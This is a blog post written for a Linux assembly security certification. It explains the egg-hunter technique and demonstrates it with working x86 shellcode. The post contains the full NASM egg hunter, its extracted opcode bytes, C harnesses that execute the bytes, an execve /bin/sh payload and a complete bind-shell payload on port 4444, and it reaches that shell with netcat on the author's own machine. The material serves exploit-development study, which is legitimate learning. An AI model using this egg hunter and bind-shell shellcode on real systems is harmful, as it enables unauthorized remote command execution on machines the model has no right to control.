# SLAE course
This blog post has been created for completing the requirements of the SecurityTube Linux.

Assembly Expert certification:
* https://www.pentesteracademy.com/course?id=3

Student ID: SLAE-XXXXX

## Assignment#3: What to do ?
This assignment is divided in 3 steps:
* Define and explain an egg hunter
* Create a working demo of an egg hunter
* Make the egg hunter easily configurable for different payloads

Now, let's get to work.
=

## Step 1: Define and explain an egg hunter
The Egg hunting technique is used when there are not enough available consecutive memory locations to insert the shellcode.  Instead, a unique “tag” is prefixed with shellcode. 

When the “Egg hunter” shellcode is executed, it searches for the unique “tag” that was prefixed with the large payload and starts the execution of the payload. 

In classic stack based buffer overflow, the buffer size is big enough to hold the shellcode. But, what will happen if there is not enough consecutive memory space available for the shellcode to fit in after overwrite happens.

In general the egg hunter code needs to follow three rules:
1) It must be robust
    * This requirement is used to express the fact that the egg hunter must be capable of searching through memory regions that are invalid and would otherwise crash the application if they were to be dereferenced improperly. It must also be capable of searching for the egg anywhere in memory.
2) It must be small
    * The size is a principal requirement for the egg hunters as they must be able to go where no other payload would be able to fit when used in conjunction with an exploit. The smaller the better.
3) It should be fast
    * In order to avoid sitting idly for minutes while the egg hunter does its task, the methods used to search VAS should be as quick as possible, without violating the first requirement or second requirements without proper justification.

An amazing PDF from "hick.org" describes the whole process and how to use it:
[Link to PDF](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)

## Step 2: create a working demo of an egg hunter
The egg hunter code is divided in four major parts:
1) The first step initialize the registers to NULL. 

2) The next step is to perform a page alignment operation on the current pointer that is being validated by doing a bitwise OR operation on the low 16-bits of the current pointer (stored in edx) and then incrementing edx by one. This operation is equivalent to adding 0x1000 to the value in edx. The reason these two operations are separated is to avoid nullbytes inside the shellcode.

3) The third step is to use a systemcall 'access' which will take an address as a parameter and check for us if the memory address is valid. If not the systemcall will return '0xf2' telling us the given address is invalid and then loop until the result returns a valid address.

4) The last step is to check two times the presence of the egg. Because, if we don't do this check a second time the egg hunter code will jump on the wrong memory address and then execute an invalid code.

The egg hunter shellcode:
```nasm
global _start

;FIRST PART
_start:
	xor ecx, ecx 			;Initialize ecx to NULL
	mul ecx				;Initilize eax and edx to NULL

;SECOND PART
_firstStep:
	or dx, 0xfff			;Do a OR on dx register, dx == 0xFFF

_secondStep:
	inc edx				;Add 1 to edx, edx == 0x1000

    ;THIRD PART
	lea ebx, [edx+0x4]		;ebx now holds the value of edx + 0x4
	push byte +0x21			;Push 0x21 on the stack
	pop eax				;Pop 0x21 which is the systemcall value of access
	int 0x80			;Go for it
	cmp al, 0xf2			;Compare the systemcall return value to 0x2f
	jz _firstStep			;If zero, the program will jump to '_firstStep'. Which means the return value is not a valid memory address

    ;FOURTH PART
	mov eax, 0x50905090		;This instruction will move our egg value inside eax
	mov edi, edx			;Move the address stores in edx to edi
	scasd				;This instruction will compare the value inside eax and edi
	jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
	scasd				;We check a second time the presence of our egg before executing the shellcode
	jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
	jmp edi				;Jump to our payload
```

Let's compile it:
```console
kali@kali:/tmp$ nasm -f elf32 -o egg_hunter.o egg_hunter.nasm
kali@kali:/tmp$ ld -m elf_i386 -z execstack -o egg_hunter egg_hunter.o
```

We can obtain the hexadecimal representation of the previous code by using the following command:
```console
kali@kali:/tmp$ objdump -d ./egg_hunter |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
```

The following C code is used to test our egg hunter:
```c
#include <stdio.h>
#include <string.h>

// egg_hunter.nasm shellcode is stored here
unsigned char egg_hunter[] = \
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char shellcode[] = \
"\x90\x50\x90\x50" // first egg
"\x90\x50\x90\x50" // second egg
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

void main()
{
	// print the length of the shellcodes
	printf("Egg hunter shellcode Length:  %d\n", strlen(egg_hunter));
	printf("Egg shellcode Length:  %d\n", strlen(shellcode));

	// convert shellcode to a function
	int (*ret)() = (int(*)())egg_hunter;
	// execute the shellcode has a function
	ret();

}
```

Let's compile it and execute it:
```console
kali@kali:/tmp$ ./test_shellcode 
Egg hunter shellcode Length:  37
Egg shellcode Length:  31
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
$ whoami
kali
$ exit
```

## Step 3: make the egg hunter easily configurable for different payloads
For this part, we will use the bind_shell.nasm code from the assignment#1.

We first need to compile it:
```console
kali@kali:/tmp$ nasm -f elf32 -o bind_shell.o bind_shell.nasm
kali@kali:/tmp$ ld -m elf_i386 -z execstack -o bind_shell bind_shell.o
```

We can obtain the hexadecimal representation of the previous code by using the following command:
```console
kali@kali:/tmp$ objdump -d ./bind_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x11\x5c\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
```

We will use exactly the same C code has shown before to test a different payload. In this case our bind shell.
```c
#include <stdio.h>
#include <string.h>

// egg_hunter.nasm shellcode is stored here
unsigned char egg_hunter[] = \
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

// the bind shell code is stored inside this variable precede by two eggs
unsigned char shellcode[] = \
"\x90\x50\x90\x50" // first egg
"\x90\x50\x90\x50" // second egg
"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x11\x5c\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

void main()
{
	// print the length of the shellcodes
	printf("Egg hunter shellcode Length:  %d\n", strlen(egg_hunter));
	printf("Egg shellcode Length:  %d\n", strlen(shellcode));

	// convert shellcode to a function
	int (*ret)() = (int(*)())egg_hunter;
	// execute the shellcode has a function
	ret();

}
```

Let's compile the code and execute it:
```console
kali@kali:/tmp$ ./test_shellcode 
Egg hunter shellcode Length:  37
Egg shellcode Length:  125

```

We can use netcat to check if the port 4444 is open:
```console
kali@kali:/tmp$ netstat -antp | grep 4444
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      2172/./test_shellcode
```

Finaly, netcat can be used to access our bind shell 
```console
kali@kali:/tmp$ nc -nv 127.0.0.1 4444
(UNKNOWN) [127.0.0.1] 4444 (?) open
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
whoami
kali
exit
```